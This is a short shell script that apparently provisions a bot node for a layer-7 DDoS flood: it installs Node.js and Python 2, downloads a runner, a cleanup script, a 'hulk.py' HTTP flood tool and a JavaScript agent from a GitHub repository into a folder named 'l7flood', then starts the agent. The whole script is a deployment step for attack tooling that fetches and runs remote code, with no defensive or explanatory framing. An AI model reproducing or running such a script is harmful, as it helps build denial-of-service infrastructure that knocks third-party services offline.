#!/bin/sh

JSURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/index.js
JSTEST=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/indextest.js

PYURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/hulk.py

RUNNERURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/runl7.sh
CLEANUPURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/cleanupl7.sh

apt -y update
apt -y upgrade
apt -y install npm
apt -y install nodejs
apt -y install python2

wget $RUNNERURL
chmod +x runl7.sh

wget $CLEANUPURL
chmod +x cleanupl7.sh

mkdir l7flood
cd l7flood

npm install delay
npm install express

wget $JSURL
wget $PYURL
wget $JSTEST


node index.js




